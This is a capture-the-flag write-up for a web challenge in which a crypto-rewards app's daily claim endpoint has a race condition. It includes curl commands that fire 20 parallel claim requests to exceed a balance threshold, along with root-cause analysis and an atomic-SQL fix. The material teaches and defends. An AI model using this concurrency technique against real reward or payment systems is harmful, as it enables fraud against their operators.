# Towel on the Sunbed

**Category:** Web Exploitation  
**Difficulty:** Medium  
**Points:** 90  
**Tags:** `Web Exploitation` `Business Logic` `Burp Suite` `API Abuse`

## Challenge Description

> Ponzi found the resort's wellness portal running a little side project called *Ponzi* — a crypto rewards app, poolside edition. He set his towel down, claimed his daily reward, and went to reapply sunscreen. He came back to find the sunbed had been "claimed" three times over while he wasn't looking.
>
> He's convinced the app owes him a spot in the Whale Vault. The app disagrees, politely, once every 24 hours. Somewhere between his request and the server's clock, there's a gap wide enough to walk a whale through.

**Objective:** Create a guest account, understand the daily reward mechanism, exploit the flaw, and retrieve the flag from the Whale Vault.

---

## Recon

The app is an Express-based crypto rewards site called "Ponzi Portfolio."

- `/` redirects to `/auth/login`
- Reading the login page source revealed the real auth routes:
  - `POST /auth/register`
  - `POST /auth/login`
- After registering, a session cookie (`connect.sid`) is issued.
- `/dashboard` loads `/js/dashboard.js`, which exposes the real client-side API calls:
  - `GET /dashboard/api/me` — returns `balance`, `tier`, `canClaim`, `secondsUntilClaim`
  - `POST /claim` — claims the daily reward
  - `GET /vault` — returns the flag once `balance >= 150` (`WHALE_THRESHOLD`)

## Vulnerability

**Race Condition (TOCTOU — Time-Of-Check to Time-Of-Use)**

The `/claim` endpoint checks whether the user has already claimed in the last 24 hours, then updates the balance and claim timestamp as two separate, non-atomic steps. Firing many concurrent requests exploits the gap between the check and the write, letting multiple claims succeed instead of just one.

## Exploitation Steps

**1. Register an account and capture the session:**
```bash
curl -s -c cookies.txt -i -X POST http://MACHINE_IP:3000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"pass123"}'
```

**2. Confirm claim eligibility:**
```bash
curl -s -b cookies.txt http://MACHINE_IP:3000/dashboard/api/me
```
Look for `"canClaim": true`.

**3. Fire concurrent claim requests to win the race:**
```bash
for i in {1..20}; do
  curl -s -b cookies.txt -X POST http://MACHINE_IP:3000/claim &
done
wait
```
Multiple responses return a successful claim (instead of `"Reward already claimed"`), pushing the balance above the 150 PONZI whale threshold.

**4. Retrieve the flag:**
```bash
curl -s -b cookies.txt http://MACHINE_IP:3000/vault
```

## Root Cause

The claim-eligibility check and the balance/timestamp update are not wrapped in an atomic transaction, and there is no locking mechanism around the operation. This is a classic **business logic race condition** in a financial/reward flow.

## Remediation

- Perform the check-and-update as a single atomic database operation, e.g.:
```sql
  UPDATE users
  SET balance = balance + reward, last_claim = NOW()
  WHERE id = ? AND last_claim < NOW() - INTERVAL 24 HOUR;
```
  Only one concurrent request can succeed since the `WHERE` clause re-validates eligibility at write time.
- Alternatively, enforce a per-user lock/mutex or a unique constraint (e.g., one claim row per user per day) to serialize claim attempts.

---
## Proof of Concept / Results

**Burp Suite Intruder Attempt (Sequential-ish, didn't work):**
Even with Burp Intruder sending rapid requests, every single response came back `429 Reward already claimed` — Intruder's threads weren't tight enough in timing to land inside the race window.

![Intruder Attack](./screenshots/intruder_attack.png)

**Working Exploit — True Parallel curl Requests:**
Firing 20 truly simultaneous background curl processes (`&` + `wait`) closed the timing gap Burp couldn't, and multiple claims landed successfully before the server's check caught up — pushing the balance past the 150 PONZI whale threshold.

**Room Completed:**
![Room Completion](./screenshots/completion.png)

- Points earned: **135**
- Streak: **117**

---

## Challenge Card

![Towel on the Sunbed](./screenshots/sunbed_task.png)

---

## Lessons Learned

- Client-side JS (`dashboard.js`) can reveal the true API surface when route names aren't guessable.
- Rate-limit-looking errors (`429`) aren't always infrastructure-level — read the actual error body before assuming.
- True concurrency (parallel background curl requests via `&` / `wait`) can expose race windows that sequential or loosely-timed requests miss.
